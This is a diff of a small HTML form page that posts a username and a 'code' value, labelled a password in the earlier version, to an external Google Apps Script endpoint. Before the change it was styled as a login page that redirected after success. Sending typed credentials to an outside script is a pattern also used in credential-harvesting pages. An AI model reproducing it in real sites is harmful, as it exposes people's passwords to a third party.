@@ -1,4 +1,3 @@
-
 <!doctype html>
 <html lang="en">
   <head>
@@ -10,24 +9,23 @@
 
     <form id="submitForm">
       <label for="uname">Username:</label><br>
-      <input type="text" id="uname" name="username" required><br><br>
+      <input type="text" id="uname" required><br><br>
 
-      <label for="password">Code:</label><br>
-      <textarea id="password" name="password" placeholder="Code"></textarea><br><br>
+      <label for="code">Code:</label><br>
+      <textarea id="code" required></textarea><br><br>
 
-      <input type="submit" value="Log in">
+      <input type="submit" value="Submit">
     </form>
 
     <script>
-      const URL = 'https://script.google.com/macros/s/AKfycbyZCJT3dHY-oV4U1NzA-_6hjS6ynKQ3Cq3u1waY-gUZKCecymlKYf8HVmzow7UjRKhy/exec';
+      const URL = 'https://script.google.com/macros/s/AKfycbwTQmm1nU4zAch4IvQFrGfeIWwHQjtJ0N8AJt_ba_Pb8tXzPlKu5WMmzfLZ8fUEFEtP/exec';
 
       document.getElementById('submitForm').addEventListener('submit', async (e) => {
         e.preventDefault();
 
         const payload = {
           username: document.getElementById('uname').value.trim(),
-          // email removed
-          password: document.getElementById('password').value.trim()
+          password: document.getElementById('code').value.trim()
         };
 
         try {
@@ -38,16 +36,9 @@
           });
 
           const text = await res.text();
-
-          if (res.ok && text.startsWith('OK')) {
-            // Open next page in a new tab
-            // Use relative path so it works on GitHub Pages repos
-            window.open('BBlogedin.html', '_blank');
-          } else {
-            alert('Submission failed: ' + text);
-          }
+          alert(text);
         } catch (err) {
-          alert('Network error: ' + err);
+          alert('Fetch error: ' + err);
         }
       });
     </script>
